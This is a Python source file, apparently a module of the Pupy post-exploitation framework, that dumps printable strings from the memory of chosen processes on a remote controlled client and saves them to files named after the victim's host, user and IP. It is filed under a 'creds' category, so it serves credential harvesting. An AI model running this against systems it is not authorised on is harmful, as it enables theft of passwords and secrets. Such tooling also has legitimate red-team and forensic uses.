# -*- coding: utf-8 -*-
import os
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import obtain

__class_name__="MemStrings"

@config(cat="creds", compat=["windows", "linux"])
class MemStrings(PupyModule):
    """
        Dump printable strings from process memory for futher analysis
    """
    dependencies=['memorpy', 'memstrings']

    termevent = None

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='memstrings', description=self.__doc__)
        action = self.arg_parser.add_mutually_exclusive_group(required=True)
        action.add_argument('-p', '--pid', nargs='*', type=int, default=[],
                                help='Include processes with specified pids')
        action.add_argument('-n', '--name', nargs='*', default=[],
                                help='Include processes with specified names')
        self.arg_parser.add_argument('-x', '--omit', type=str, default='isrx',
                                help='Avoid scanning: '
                                'i - ranges with file mapping; '
                                's - ranges with shared region; '
                                'x - ranges with executable region; '
                                'r - ranges with read-only region')
        self.arg_parser.add_argument('-l', '--min-length', type=int, default=4,
                                help='Show only strings which are longer then specified length')
        self.arg_parser.add_argument('-m', '--max-length', type=int, default=51,
                                help='Show only strings which are shorter then specified length')
        self.arg_parser.add_argument('-P', '--portions', type=int, default=8192,
                                help='Strings portion block')
        self.arg_parser.add_argument('-d', '--no-duplication', default=False, action='store_true',
                                help='Enable strings deduplication (will increase memory usage)')
        self.arg_parser.add_argument(
            '-o', '--output',
            help='Save output to file. Omit output to stdout. You can use vars: '
            '%%h - host, %%m - mac, %%P - platform, %%u - user, %%a - ip address'
            '%%p - pid, %%n - name'
        )

    def run(self, args):
        targets = args.pid + args.name

        self.termevent = self.client.conn.modules.threading.Event()

        logs = {}

        for pid, name, strings in self.client.conn.modules.memstrings.iterate_strings(
                targets,
                min_length=args.min_length,
                max_length=args.max_length,
                omit=args.omit,
                portions=args.portions,
                terminate=self.termevent,
                nodup=args.no_duplication,
        ):

            strings = obtain(strings)
            pid = str(pid) or '0'
            name = str(name) or ''

            if not strings:
                self.error('No dumps received')
                return

            if args.output:
                if not pid in logs:
                    log = args.output.replace(
                        '%m', self.client.desc['macaddr']
                    ).replace(
                        '%P', self.client.desc['platform']
                    ).replace(
                        '%a', self.client.desc['address']
                    ).replace(
                        '%h', self.client.desc['hostname'].replace(
                            '..', '__'
                        ).replace(
                            '/', '_'
                        )
                    ).replace(
                        '%u', self.client.desc['user'].replace(
                            '..', '__'
                        ).replace(
                            '/', '_'
                        )
                    ).replace(
                        '%p', str(pid),
                    ).replace(
                        '%n', name.replace(
                            '..', '__'
                        ).replace(
                            '/', '_'
                        ),
                    )

                    dirname = os.path.dirname(log)
                    if not os.path.exists(dirname):
                        os.makedirs(dirname)

                    self.success('Dumping {}:{} -> {}'.format(name, pid, log))
                    logs[pid] = open(log, 'a+')

                for s in strings:
                    logs[pid].write(s+'\n')

                logs[pid].flush()

            else:
                self.success('Strings {}:{}'.format(name, pid))
                for s in strings:
                    self.stdout.write(s+'\n')

                self.stdout.write('\n')

        for log in logs.itervalues():
            log.close()

    def interrupt(self):
        if self.termevent:
            self.termevent.set()
